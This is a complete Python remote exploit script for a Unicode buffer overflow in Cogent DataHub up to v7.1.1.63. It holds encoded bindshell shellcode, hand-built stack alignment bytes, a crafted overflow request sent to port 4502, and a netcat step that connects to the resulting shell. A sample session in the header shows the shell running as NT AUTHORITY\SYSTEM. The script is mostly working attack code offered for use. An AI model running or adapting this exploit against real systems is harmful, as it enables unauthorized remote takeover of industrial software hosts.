#!/usr/bin/python
#
# Cogent Datahub <= v7.1.1.63 Remote Unicode Buffer Overflow Exploit
# tested on:
# - windows server 2003
# - windows XP sp3
# questions >> @net__ninja || @luigi_auriemma
# example usage:
# [mr_me@neptune cognet]$ ./cognet_overflow.py 192.168.114.130
#
# -----------------------------------------------------
# ------ Cogent Datahub Unicode Overflow Exploit ------
# ------------- Found by Luigi Auriemma ---------------
# --------- SYSTEM exploit by Steven Seeley -----------
#
# (+) Sending overflow...
# (+) Getting shell..
# Connection to 192.168.114.130 1337 port [tcp/menandmice-dns] succeeded!
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>whoami
# whoami
# nt authority\system
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>

import socket,time,sys,os

# bindshell on port 1337
shellcodez = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQA"
"IAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1"
"111AIAJQI1AYAZBABABABAB30APB944JBKLQZJKPMK8JYKOKOKOQPTK"
"2LMTMTDKOUOLTKCLKUT8M1JOTKPOLXTKQOMPM1JKOY4KNTTKM1JNNQ9"
"04Y6LU4I0D4M77QHJLMKQ92ZKL4OK0TMTO8BUIUTK1OO4KQZK1VDKLL"
"PKTKQOMLM1ZKM3NLTKU9RLMTMLQQ7SNQ9KQTTK0CNP4KOPLL4KRPMLV"
"M4KOPLHQN384NPNLNJLPPKOJ6QVPSQVQX03OBRHT7RSNR1OB4KO8PBH"
"XKZMKLOKR0KOHVQOU9YU1VE1JMM8KRB5QZLBKOXPBH8YM9JUFMQGKOZ"
"6PSPSR30SQCPC23PCPSKOXPC6RHKUP936PSSYYQV5QX5TMJ40GWPWKO"
"8VRJLPR1R5KOHPQXG4VMNNIY0WKOZ6QC25KOXPBH9U19U6OY27KO9FP"
"PR4R41EKOXPUC1X9W49GVRYPWKO8V0UKOXP1VQZRD2FQXQSBMU9YUQZ"
"0PPYNI8LTI9W2J14U9K201GPKCUZKNORNMKNPBNL63TM2ZNXVKFK6KQ"
"XBRKNVSN6KOT5Q4KOIFQK0WB2PQ0Q0Q1ZM1PQR1PUR1KOXPRHVMJ9KU"
"8NQCKOHVQZKOKO07KOZ0DK0WKLTCWTRDKOHV0RKO8P38JPTJKTQOR3K"
"O8VKO8PKZA")

align= ""
align += "\x54"			# push esp
align += "\x6f"
align += "\x58"			# pop eax
align += "\x6f"
align += "\x05\x6f\x11"	# add eax,11006f00   
align += "\x6f" 
align += "\x2d\x37\x01"	# sub eax,01003700
align += "\x6f"
align += "\x2d\x37\x10"	# sub eax,11003700
align += "\x6f"
align += "\x50"			# push eax
align += "\x6f"
align += "\x48"			# dec eax
align += "\x6f"
align += "\x48"			# dec eax
align += "\x6f"
align += "\x55"			# push ebp
align += "\x6f"
align += "\x59"			# pop ecx
align += "\x08"			# add [eax],cl (carve a 'RETN' onto the stack)
align += "\x6f"
align += "\x40"			# inc eax
align += "\x6f"
align += "\x40"			# inc eax
align += "\x6f\x41" * (48)	# inc ecx (will not effect to our payload)
align += "\x6f"
align += "\x62"			# becomes our carved RETN on the stack (0x61+0x62=0xc3)

request = "(domain \""
request += "\x61" * 1019
request += "\x7f\x55" 	# jmp esp 0x0055007f
request += align
request += shellcodez
request += "\")\r\n"

def banner():
	banner = "\n-----------------------------------------------------\n"
	banner += "------ Cogent Datahub Unicode Overflow Exploit ------\n"
	banner += "------------- Found by Luigi Auriemma ---------------\n"
	banner += "--------- SYSTEM exploit by Steven Seeley -----------\n"
	return banner

if len(sys.argv) < 2:
	print banner()
	print "(-) Usage: %s <target addr> " % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
print banner()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,4502))
except:
    print "[-] Connection to %s failed! % (target)"
    sys.exit(0)

print "(+) Sending overflow..."
s.send(request)
s.recv(1024)
# wait for the target, sheesh.
time.sleep(2)
print "(+) Getting shell.."
os.system("nc -vv %s 1337" % target)
s.close()

